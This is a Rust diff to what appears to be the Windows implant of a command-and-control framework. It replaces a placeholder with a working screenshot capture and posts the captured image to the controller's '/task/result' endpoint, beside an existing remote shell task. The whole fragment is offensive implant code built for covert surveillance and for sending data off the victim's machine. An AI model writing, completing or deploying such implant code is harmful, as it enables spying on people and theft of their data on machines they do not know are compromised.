@@ -7,12 +7,12 @@ use windows::core::{Error, HSTRING};
 use crate::{
     agents::AgentData,
     Config,
-    handlers::{
-        async_handlers_windows::HRequestAsync,
-        handlers_windows::{HConnect, HInternet, HRequest, HSession},
+    handlers::win::{
+        async_handler::HRequestAsync,
+        handler::{HConnect, HInternet, HRequest, HSession},
     },
     systeminfo::systeminfo_windows::get_computer_name,
-    tasks::win::shell::shell,
+    tasks::win::{screenshot::screenshot, shell::shell},
     utils::random::random_name,
 };
 
@@ -94,7 +94,16 @@ pub async fn run(config: Config) -> Result<(), Error> {
         match task_args[0].as_str() {
             "screenshot" => {
                 // Take a screenshot
-                ra.task_result = Some("This is Screenshot.".as_bytes().to_vec());
+                match screenshot().await {
+                    Ok(result) => {
+                        ra.task_result = Some(result);
+                    }
+                    Err(e) => {
+                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
+                    }
+                }
+                // ra.task_result = screenshot().await;
+                // ra.task_result = Some("This is Screenshot.".as_bytes().to_vec());
                 let ra_json = serde_json::to_string(&ra).unwrap();
                 post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
             }
